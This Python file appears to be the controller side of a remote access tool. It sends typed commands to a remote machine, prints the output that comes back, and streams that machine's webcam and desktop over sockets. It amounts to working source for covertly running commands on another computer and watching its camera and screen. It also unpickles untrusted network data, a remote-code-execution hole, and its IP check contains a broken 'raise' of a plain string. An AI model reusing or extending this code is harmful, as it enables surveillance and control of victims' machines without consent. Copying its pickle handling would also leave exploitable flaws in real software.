from config import *


def get_ip():
    def validation_ip():
        ipp = sys.argv[1]
        if len(ipp.split('.')) == 4:
            return ipp
        else:
            raise '[ERROR] IP is invalid'

    if len(sys.argv) == 2:
        ip = validation_ip()
    else:
        ip = input('IP [default = 127.0.0.1] > ')
        if not ip:
            ip = LOCAL_IP
    return ip


def get_stream(sock: socket.socket, port: int):
    new_sock = socket.socket()
    new_sock.connect((sock.getsockname()[0], port))

    while True:
        try:
            response = new_sock.recv(10000000)
            frame = pickle.loads(response)
            cv2.imshow(f'{new_sock.getsockname()}', frame)
            if cv2.waitKey(1) == ord(QUIT_STREAM):
                new_sock.send(STOP_STREAM_STATUS.encode())
                cv2.destroyWindow(f'{new_sock.getsockname()}')
                break
            else:
                new_sock.send(b'play')
        except ConnectionResetError:
            pass


def terminal(sock: socket.socket):
    response = sock.recv(4096)
    print(response.decode())


def controller(text: str, sock: socket.socket):
    if CONTROLLER_WEBCAM in text:
        get_stream(sock, WEBCAM_PORT)
    elif CONTROLLER_DESKTOP in text:
        get_stream(sock, DESKTOP_PORT)
    else:
        terminal(sock)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((get_ip(), MAIN_PORT))
    while True:
        command = input(' > ')
        s.send(command.encode())
        Thread(target=controller, args=(command, s)).start()


if __name__ == '__main__':
    main()
